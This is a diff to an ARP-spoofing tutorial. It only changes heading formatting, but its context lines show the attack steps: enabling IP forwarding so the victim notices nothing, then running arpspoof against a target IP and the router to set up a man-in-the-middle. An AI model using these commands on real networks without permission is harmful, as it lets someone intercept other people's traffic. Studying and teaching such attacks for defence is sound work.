@@ -46,7 +46,9 @@ The objective of this attack is to add/replace some entries in the ARP table mak
 
 First you need to enable fowarding of packets so the victim doesn't know that something happened.
 
-#### Temporary fowarding:
+___
+
+#### Temporary fowarding
 
 For temporary fowarding (this will disable fowarding when the machine is rebooted):
 
@@ -60,7 +62,9 @@ or
  sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
-#### Permanent fowarding:
+___
+
+#### Permanent fowarding
 
 ```console
  sudo nano /etc/sysctl.conf
@@ -94,7 +98,7 @@ and finally run this to apply the changes:
  sudo sysctl -p /etc/sysctl.conf
 ```
 
-### Making a man in the middle with Arpspoof:
+### Making a man in the middle with Arpspoof
 
 To make this we will use this command two times:
 
@@ -102,7 +106,9 @@ To make this we will use this command two times:
  sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
 ```
 
-#### First terminal:
+___
+
+#### First terminal
 
 First to make the router think that our machine is the victim:
 
@@ -116,7 +122,9 @@ Example:
  sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
 ```
 
-#### Second terminal:
+___
+
+#### Second terminal
 
 Then we make the victim think that our machine is the router:
 
